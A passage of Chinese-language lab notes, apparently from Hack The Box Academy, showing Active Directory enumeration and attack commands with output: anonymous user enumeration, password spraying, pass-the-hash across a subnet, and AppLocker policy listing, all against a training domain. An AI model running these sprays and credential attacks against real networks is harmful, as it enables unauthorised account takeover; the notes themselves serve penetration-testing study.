class="title">password</span> <span class="title">age</span> (<span class="title">days</span>):                          <span class="title">Unlimited</span></span></span><br><span class="line"><span class="function"><span class="title">Minimum</span> <span class="title">password</span> <span class="title">length</span>:                              8</span></span><br><span class="line"><span class="function"><span class="title">Length</span> <span class="title">of</span> <span class="title">password</span> <span class="title">history</span> <span class="title">maintained</span>:                24</span></span><br><span class="line"><span class="function"><span class="title">Lockout</span> <span class="title">threshold</span>:                                    5</span></span><br><span class="line"><span class="function"><span class="title">Lockout</span> <span class="title">duration</span> (<span class="title">minutes</span>):                           30</span></span><br><span class="line"><span class="function"><span class="title">Lockout</span> <span class="title">observation</span> <span class="title">window</span> (<span class="title">minutes</span>):                 30</span></span><br><span class="line"><span class="function"><span class="title">Computer</span> <span class="title">role</span>:                                        <span class="title">SERVER</span></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">command</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br></pre></td></tr></table></figure>

<p><strong>PowerView</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">import-module</span> .\PowerView.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-DomainPolicy</span></span><br><span class="line"></span><br><span class="line">Unicode        : <span class="selector-tag">@</span>&#123;Unicode=yes&#125;</span><br><span class="line">SystemAccess   : <span class="selector-tag">@</span>&#123;MinimumPasswordAge=<span class="number">1</span>; MaximumPasswordAge=<span class="literal">-1</span>; MinimumPasswordLength=<span class="number">8</span>; PasswordComplexity=<span class="number">1</span>;</span><br><span class="line">                 PasswordHistorySize=<span class="number">24</span>; LockoutBadCount=<span class="number">5</span>; ResetLockoutCount=<span class="number">30</span>; LockoutDuration=<span class="number">30</span>;</span><br><span class="line">                 RequireLogonToChangePassword=<span class="number">0</span>; ForceLogoffWhenHourExpire=<span class="number">0</span>; ClearTextPassword=<span class="number">0</span>;</span><br><span class="line">                 LSAAnonymousNameLookup=<span class="number">0</span>&#125;</span><br><span class="line">KerberosPolicy : <span class="selector-tag">@</span>&#123;MaxTicketAge=<span class="number">10</span>; MaxRenewAge=<span class="number">7</span>; MaxServiceAge=<span class="number">600</span>; MaxClockSkew=<span class="number">5</span>; TicketValidateClient=<span class="number">1</span>&#125;</span><br><span class="line">Version        : <span class="selector-tag">@</span>&#123;signature=<span class="string">&quot;<span class="variable">$CHICAGO</span><span class="variable">$</span>&quot;</span>; Revision=<span class="number">1</span>&#125;</span><br><span class="line">RegistryValues : <span class="selector-tag">@</span>&#123;MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=System.Object[]&#125;</span><br><span class="line">Path           : \\INLANEFREIGHT.LOCAL\sysvol\INLANEFREIGHT.LOCAL\Policies\&#123;<span class="number">31</span>B2F340<span class="literal">-016D-11D2-945F-00C04FB984F9</span>&#125;\MACHI</span><br><span class="line">                 NE\Microsoft\Windows NT\SecEdit\GptTmpl.inf</span><br><span class="line">GPOName        : &#123;<span class="number">31</span>B2F340<span class="literal">-016D-11D2-945F-00C04FB984F9</span>&#125;</span><br><span class="line">GPODisplayName : Default Domain Policy</span><br></pre></td></tr></table></figure>

<h2 id="4-获取用户名列表"><a href="#4-获取用户名列表" class="headerlink" title="4. 获取用户名列表"></a>4. 获取用户名列表</h2><h3 id="SMB-NULL-1"><a href="#SMB-NULL-1" class="headerlink" title="SMB NULL"></a>SMB NULL</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">C47Sh4rk@htb[/htb]$ enum4linux -U 172.16.5.5  | grep <span class="string">&quot;user:&quot;</span> | <span class="built_in">cut</span> -f2 -d<span class="string">&quot;[&quot;</span> | <span class="built_in">cut</span> -f1 -d<span class="string">&quot;]&quot;</span></span><br><span class="line"></span><br><span class="line">administrator</span><br><span class="line">guest</span><br><span class="line">krbtgt</span><br><span class="line">lab_adm</span><br><span class="line">htb-student</span><br><span class="line">avazquez</span><br><span class="line">pfalcon</span><br><span class="line">fanthony</span><br><span class="line">wdillard</span><br><span class="line">lbradford</span><br><span class="line">sgage</span><br><span class="line">asanchez</span><br><span class="line">dbranch</span><br><span class="line">ccruz</span><br><span class="line">njohnson</span><br><span class="line">mholliday</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">C47Sh4rk@htb[/htb]$ rpcclient -U <span class="string">&quot;&quot;</span> -N 172.16.5.5</span><br><span class="line"></span><br><span class="line">rpcclient $&gt; enumdomusers </span><br><span class="line">user:[administrator] rid:[0x1f4]</span><br><span class="line">user:[guest] rid:[0x1f5]</span><br><span class="line">user:[krbtgt] rid:[0x1f6]</span><br><span class="line">user:[lab_adm] rid:[0x3e9]</span><br><span class="line">user:[htb-student] rid:[0x457]</span><br><span class="line">user:[avazquez] rid:[0x458]</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C47Sh4rk@htb[/htb]$ crackmapexec smb 172.16.5.5 --<span class="built_in">users</span></span><br><span class="line"></span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 0 baddpwdtime: 2022-01-10 13:23:09.463228</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\lab_adm                        badpwdcount: 0 baddpwdtime: 2021-12-21 14:10:56.859064</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\htb-student                    badpwdcount: 0 baddpwdtime: 2022-02-22 14:48:26.653366</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\avazquez                       badpwdcount: 0 baddpwdtime: 2022-02-17 22:59:22.684613</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h3 id="LDAP-Anonymous"><a href="#LDAP-Anonymous" class="headerlink" title="LDAP Anonymous"></a>LDAP Anonymous</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">C47Sh4rk@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b <span class="string">&quot;DC=INLANEFREIGHT,DC=LOCAL&quot;</span> -s sub <span class="string">&quot;(&amp;(objectclass=user))&quot;</span>  | grep sAMAccountName: | <span class="built_in">cut</span> -f2 -d<span class="string">&quot; &quot;</span></span><br><span class="line"></span><br><span class="line">guest</span><br><span class="line">ACADEMY-EA-DC01$</span><br><span class="line">ACADEMY-EA-MS01$</span><br><span class="line">ACADEMY-EA-WEB01$</span><br><span class="line">htb-student</span><br><span class="line">avazquez</span><br><span class="line">pfalcon</span><br><span class="line">fanthony</span><br><span class="line">wdillard</span><br><span class="line">lbradford</span><br><span class="line">sgage</span><br><span class="line">asanchez</span><br><span class="line">dbranch</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">C47Sh4rk@htb[/htb]$ ./windapsearch.py --dc-ip 172.16.5.5 -u <span class="string">&quot;&quot;</span> -U</span><br><span class="line"></span><br><span class="line">[+] No username provided. Will try anonymous <span class="built_in">bind</span>.</span><br><span class="line">[+] Using Domain Controller at: 172.16.5.5</span><br><span class="line">[+] Getting defaultNamingContext from Root DSE</span><br><span class="line">[+]	Found: DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">[+] Attempting <span class="built_in">bind</span></span><br><span class="line">[+]	...success! Binded as: </span><br><span class="line">[+]	 None</span><br><span class="line"></span><br><span class="line">[+] Enumerating all AD <span class="built_in">users</span></span><br><span class="line">[+]	Found 2906 <span class="built_in">users</span>: </span><br><span class="line"></span><br><span class="line">cn: Guest</span><br><span class="line"></span><br><span class="line">cn: Htb Student</span><br><span class="line">userPrincipalName: htb-student@inlanefreight.local</span><br><span class="line"></span><br><span class="line">cn: Annie Vazquez</span><br><span class="line">userPrincipalName: avazquez@inlanefreight.local</span><br><span class="line"></span><br><span class="line">cn: Paul Falcon</span><br><span class="line">userPrincipalName: pfalcon@inlanefreight.local</span><br><span class="line"></span><br><span class="line">cn: Fae Anthony</span><br><span class="line">userPrincipalName: fanthony@inlanefreight.local</span><br><span class="line"></span><br><span class="line">cn: Walter Dillard</span><br><span class="line">userPrincipalName: wdillard@inlanefreight.local</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Kerbrute-通过Kerberos-Pre-Authentication"><a href="#Kerbrute-通过Kerberos-Pre-Authentication" class="headerlink" title="Kerbrute(通过Kerberos Pre-Authentication)"></a>Kerbrute(通过Kerberos Pre-Authentication)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">C47Sh4rk@htb[/htb]$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt</span><br><span class="line"></span><br><span class="line">    __             __               __     </span><br><span class="line">   / /_____  _____/ /_  _______  __/ /____ </span><br><span class="line">  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \</span><br><span class="line"> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/</span><br><span class="line">/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        </span><br><span class="line"></span><br><span class="line">Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop</span><br><span class="line"></span><br><span class="line">2022/02/17 22:16:11 &gt;  Using KDC(s):</span><br><span class="line">2022/02/17 22:16:11 &gt;  	172.16.5.5:88</span><br><span class="line"></span><br><span class="line">2022/02/17 22:16:11 &gt;  [+] VALID USERNAME:	 jjones@inlanefreight.local</span><br><span class="line">2022/02/17 22:16:11 &gt;  [+] VALID USERNAME:	 sbrown@inlanefreight.local</span><br><span class="line">2022/02/17 22:16:11 &gt;  [+] VALID USERNAME:	 tjohnson@inlanefreight.local</span><br><span class="line">2022/02/17 22:16:11 &gt;  [+] VALID USERNAME:	 jwilson@inlanefreight.local</span><br><span class="line">2022/02/17 22:16:11 &gt;  [+] VALID USERNAME:	 bdavis@inlanefreight.local</span><br><span class="line">2022/02/17 22:16:11 &gt;  [+] VALID USERNAME:	 njohnson@inlanefreight.local</span><br><span class="line">2022/02/17 22:16:11 &gt;  [+] VALID USERNAME:	 asanchez@inlanefreight.local</span><br><span class="line">2022/02/17 22:16:11 &gt;  [+] VALID USERNAME:	 dlewis@inlanefreight.local</span><br><span class="line">2022/02/17 22:16:11 &gt;  [+] VALID USERNAME:	 ccruz@inlanefreight.local</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h2 id="5-密码喷洒"><a href="#5-密码喷洒" class="headerlink" title="5. 密码喷洒"></a>5. 密码喷洒</h2><p><strong>bash脚本</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C47Sh4rk@htb[/htb]$ <span class="keyword">for</span> u <span class="keyword">in</span> $(<span class="built_in">cat</span> valid_users.txt);<span class="keyword">do</span> rpcclient -U <span class="string">&quot;<span class="variable">$u</span>%Welcome1&quot;</span> -c <span class="string">&quot;getusername;quit&quot;</span> 172.16.5.5 | grep Authority; <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">Account Name: tjohnson, Authority Name: INLANEFREIGHT</span><br><span class="line">Account Name: sgage, Authority Name: INLANEFREIGHT</span><br></pre></td></tr></table></figure>

<p><strong>kerbrute</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">C47Sh4rk@htb[/htb]$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1</span><br><span class="line"></span><br><span class="line">    __             __               __     </span><br><span class="line">   / /_____  _____/ /_  _______  __/ /____ </span><br><span class="line">  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \</span><br><span class="line"> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/</span><br><span class="line">/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        </span><br><span class="line"></span><br><span class="line">Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop</span><br><span class="line"></span><br><span class="line">2022/02/17 22:57:12 &gt;  Using KDC(s):</span><br><span class="line">2022/02/17 22:57:12 &gt;  	172.16.5.5:88</span><br><span class="line"></span><br><span class="line">2022/02/17 22:57:12 &gt;  [+] VALID LOGIN:	 sgage@inlanefreight.local:Welcome1</span><br><span class="line">2022/02/17 22:57:12 &gt;  Done! Tested 57 logins (1 successes) <span class="keyword">in</span> 0.172 seconds</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C47Sh4rk@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +</span><br><span class="line"></span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C47Sh4rk@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123</span><br><span class="line"></span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C47Sh4rk@htb[/htb]$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +</span><br><span class="line"></span><br><span class="line">SMB         172.16.5.50     445    ACADEMY-EA-MX01  [+] ACADEMY-EA-MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)</span><br><span class="line">SMB         172.16.5.25     445    ACADEMY-EA-MS01  [+] ACADEMY-EA-MS01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)</span><br><span class="line">SMB         172.16.5.125    445    ACADEMY-EA-WEB0  [+] ACADEMY-EA-WEB0\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)</span><br></pre></td></tr></table></figure>

<p><strong>windows域内环境</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Import-Module</span> .\DomainPasswordSpray.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Invoke-DomainPasswordSpray</span> <span class="literal">-Password</span> Welcome1 <span class="literal">-OutFile</span> spray_success <span class="literal">-ErrorAction</span> SilentlyContinue</span><br><span class="line"></span><br><span class="line">[*] Current domain is compatible with Fine<span class="literal">-Grained</span> Password Policy.</span><br><span class="line">[*] Now creating a list of users to spray...</span><br><span class="line">[*] The smallest lockout threshold discovered <span class="keyword">in</span> the domain is <span class="number">5</span> login attempts.</span><br><span class="line">[*] Removing disabled users from list.</span><br><span class="line">[*] There are <span class="number">2923</span> total users found.</span><br><span class="line">[*] Removing users within <span class="number">1</span> attempt of locking out from list.</span><br><span class="line">[*] Created a userlist containing <span class="number">2923</span> users gathered from the current user<span class="string">&#x27;s domain</span></span><br><span class="line"><span class="string">[*] The domain password policy observation window is set to  minutes.</span></span><br><span class="line"><span class="string">[*] Setting a  minute wait in between sprays.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Confirm Password Spray</span></span><br><span class="line"><span class="string">Are you sure you want to perform a password spray against 2923 accounts?</span></span><br><span class="line"><span class="string">[Y] Yes  [N] No  [?] Help (default is &quot;Y&quot;): Y</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Password spraying has begun with  1  passwords</span></span><br><span class="line"><span class="string">[*] This might take a while depending on the total number of users</span></span><br><span class="line"><span class="string">[*] Now trying password Welcome1 against 2923 users. Current time is 2:57 PM</span></span><br><span class="line"><span class="string">[*] Writing successes to spray_success</span></span><br><span class="line"><span class="string">[*] SUCCESS! User:sgage Password:Welcome1</span></span><br><span class="line"><span class="string">[*] SUCCESS! User:tjohnson Password:Welcome1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Password spraying is complete</span></span><br><span class="line"><span class="string">[*] Any passwords that were successfully sprayed have been output to spray_success</span></span><br></pre></td></tr></table></figure>



<h1 id="AD-获取初始权限后的枚举"><a href="#AD-获取初始权限后的枚举" class="headerlink" title="AD 获取初始权限后的枚举"></a>AD 获取初始权限后的枚举</h1><h2 id="1-枚举安全控制"><a href="#1-枚举安全控制" class="headerlink" title="1. 枚举安全控制"></a>1. 枚举安全控制</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-AppLockerPolicy</span> <span class="literal">-Effective</span> | <span class="built_in">select</span> <span class="literal">-ExpandProperty</span> RuleCollections</span><br><span class="line"></span><br><span class="line">PathConditions      : &#123;%SYSTEM32%\WINDOWSPOWERSHELL\V1.<span class="number">0</span>\POWERSHELL.EXE&#125;</span><br><span class="line">PathExceptions      : &#123;&#125;</span><br><span class="line">PublisherExceptions : &#123;&#125;</span><br><span class="line">HashExceptions      : &#123;&#125;</span><br><span class="line">Id                  : <span class="number">3</span>d57af4a<span class="literal">-6cf8-4e5b-acfc-c2c2956061fa</span></span><br><span class="line">Name                : Block PowerShell</span><br><span class="line">Description         : Blocks Domain Users from <span class="keyword">using</span> PowerShell on workstations</span><br><span class="line">UserOrGroupSid      : S<span class="literal">-1-5-21-2974783224-3764228556-2640795941-513</span></span><br><span class="line">Action              : Deny</span><br><span class="line"></span><br><span class="line">PathConditions      : &#123;%PROGRAMFILES%\*&#125;</span><br><span class="line">PathExceptions      : &#123;&#125;</span><br><span class="line">PublisherExceptions : &#123;&#125;</span><br><span class="line">HashExceptions      : &#123;&#125;</span><br><span class="line">Id                  : <span class="number">921</span>cc481<span class="literal">-6e17-4653-8f75-050b80acca20</span></span><br><span class="line">Name                : (Default Rule) All files located <span class="keyword">in</span> the Program Files folder</span><br><span class="line">Description         : Allows members of the Everyone <span class="built_in">group</span> to run applications that are located <span class="keyword">in</span> the Program Files folder.</span><br><span class="line">UserOrGroupSid      : S<span class="literal">-1-1-0</span></span><br><span class="line">Action              : Allow</span><br><span class="line"></span><br><span class="line">PathConditions      : &#123;%WINDIR%\*&#125;</span><br><span class="line">PathExceptions      : &#123;&#125;</span><br><span class="line">PublisherExceptions : &#123;&#125;</span><br><span class="line">HashExceptions      : &#123;&#125;</span><br><span class="line">Id                  : a61c8b2c<span class="literal">-a319-4cd0-9690-d2177cad7b51</span></span><br><span class="line">Name                : (Default Rule) All files located <span class="keyword">in</span> the Windows folder</span><br><span class="line">Description         : Allows members of the Everyone <span class="built_in">group</span> to run applications that are located <span class="keyword">in</span> the Windows folder.</span><br><span class="line">UserOrGroupSid      : S<span class="literal">-1-1-0</span></span><br><span class="line">Action              : Allow</span><br><span class="line"></span><br><span class="line">PathConditions      : &#123;*&#125;</span><br><span class="line">PathExceptions      : &#123;&#125;</span><br><span class="line">PublisherExceptions : &#123;&#125;</span><br><span class="line">HashExceptions      : &#123;&#125;</span><br><span class="line">Id                  : fd686d83<span class="literal">-a829-4351-8ff4-27c7de5755d2</span></span><br><span class="line">Name                : (Default Rule) All files</span><br><span class="line">Description         : Allows members of the local Administrators <span class="built_in">group</span> to run all applications.</span><br><span class="line">UserOrGroupSid      : S<span class="literal">-1-5-32-544</span></span><br><span class="line">Action              : Allow</span><br></pre></td></tr></table></figure>

<h2 id="2-枚举AppLocker策略"><a href="#2-枚举AppLocker策略" class="headerlink" title="2. 枚举AppLocker策略"></a>2. 枚举AppLocker策略</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-AppLockerPolicy</span> <span class="literal">-Effective</span> | <span class="built_in">select</span> <span class="literal">-ExpandProperty</span> RuleCollections</span><br><span class="line"></span><br><span class="line">PathConditions      : &#123;%SYSTEM32%\WINDOWSPOWERSHELL\V1.<span class="number">0</span>\POWERSHELL.EXE&#125;</span><br><span class="line">PathExceptions      : &#123;&#125;</span><br><span class="line">PublisherExceptions : &#123;&#125;</span><br><span class="line">HashExceptions      : &#123;&#125;</span><br><span class="line">Id                  : <span class="number">3</span>d57af4a<span class="literal">-6cf8-4e5b-acfc-c2c2956061fa</span></span><br><span class="line">Name                : Block PowerShell</span><br><span class="line">Description         : Blocks Domain Users from <span class="keyword">using</span> PowerShell on workstations</span><br><span class="line">UserOrGroupSid      : S<span class="literal">-1-5-21-2974783224-3764228556-2640795941-513</span></span><br><span class="line">Action              : Deny</span><br><span class="line"></span><br><span class="line">PathConditions      : &#123;%PROGRAMFILES%\*&#125;</span><br><span class="line">PathExceptions      : &#123;&#125;</span><br><span class="line">PublisherExceptions : &#123;&#125;</span><br><span class="line">HashExceptions      : &#123;&#125;</span><br><span class="line">Id                  : <span class="number">921</span>cc481<span class="literal">-6e17-4653-8f75-050b80acca20</span></span><br><span class="line">Name                : (Default Rule) All files located <span class="keyword">in</span> the Program Files folder</span><br><span class="line">Description         : Allows members of the Everyone <span class="built_in">group</span> to run applications that are located <span class="keyword">in</span> the Program Files folder.</span><br><span class="line">UserOrGroupSid      : S<span class="literal">-1-1-0</span></span><br><span class="line">Action              : Allow</span><br><span class="line"></span><br><span class="line">PathConditions      : &#123;%WINDIR%\*&#125;</span><br><span class="line">PathExceptions      : &#123;&#125;</span><br><span class="line">PublisherExceptions : &#123;&#125;</span><br><span class="line">HashExceptions      : &#123;&#125;</span><br><span class="line">Id                  : a61c8b2c<span class="literal">-a319-4cd0-9690-d2177cad7b51</span></span><br><span class="line">Name                : (Default Rule) All files located <span class="keyword">in</span> the Windows folder</span><br><span class="line">Description         : Allows members of the Everyone <span class="built_in">group</span> to run applications that are located <span class="keyword">in</span> the Windows folder.</span><br><span class="line">UserOrGroupSid      : S<span class="literal">-1-1-0</span></span><br><span class="line">Action              : Allow</span><br><span class="line"></span><br><span class="line">PathConditions      : &#123;*&#125;</span><br><span class="line">PathExceptions      : &#123;&#125;</span><br><span class="line">PublisherExceptions : &#123;&#125;</span><br><span class="line">HashExceptions      : &#123;&#125;</span><br><span class="line">Id                  : fd686d83<span class="literal">-a829-4351-8ff4-27c7de5755d2</span></span><br><span class="line">Name                : (Default Rule) All files</span><br><span class="line">Description         : Allows members of the local Administrators <span 